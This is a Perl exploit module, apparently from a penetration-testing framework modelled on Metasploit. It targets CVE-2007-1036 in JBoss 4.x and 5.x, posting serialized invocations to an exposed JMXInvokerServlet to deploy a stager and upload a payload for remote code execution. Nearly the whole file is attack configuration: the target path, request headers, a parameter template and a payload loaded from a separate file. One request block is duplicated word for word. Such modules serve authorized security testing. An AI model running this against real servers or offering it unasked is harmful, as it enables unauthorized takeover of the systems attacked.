package JBOSS::MSF::JbossInvokeDeploy;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "JbossInvokeDeploy";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2007-1036",
  DESCRIPTION => "

          This module can be used to execute a payload on JBoss servers that have an

        exposed HTTPAdaptor's JMX Invoker exposed on the \"JMXInvokerServlet\". By invoking

        the methods provided by jboss.admin:DeploymentFileRepository a stager is deployed

        to finally upload the selected payload to the target. The DeploymentFileRepository

        methods are only available on Jboss 4.x and 5.x.

      ",
  METHOD => "POST",
  MSF_MODULE => "jboss_invoke_deploy",
  OSVDB => 33744,
  PATHS => ["invoker/JMXInvokerServlet"],
  PAYLOAD => "name_parameter=__NAME_PARAMETER__&content_parameter=__CONTENT_PARAMETER__&",
  REFERENCES => ["http://www.redteam-pentesting.de/publications/jboss"],
  TITLE => "JBoss DeploymentFileRepository WAR Deployment (via JMXInvokerServlet)",
  VARIABLES => {
    'CONTENT_PARAMETER' =>       { DESCRIPTION => "", VALUE => "" },
    'NAME_PARAMETER' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "The URI path of the invoker servlet",
  VALUE => "/invoker/JMXInvokerServlet",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => read_file('MSFExploits/JBOSS/MSF/src/JbossInvokeDeploy.payload', 1),
      TEXT   => 'Sending Exploit #1 Request : [POST] /',
      HEADERS      => {
        'ContentType' => ': application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => read_file('MSFExploits/JBOSS/MSF/src/JbossInvokeDeploy.payload', 1),
      TEXT   => 'Sending Exploit #1 Request : [POST] /',
      HEADERS      => {
        'ContentType' => ': application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
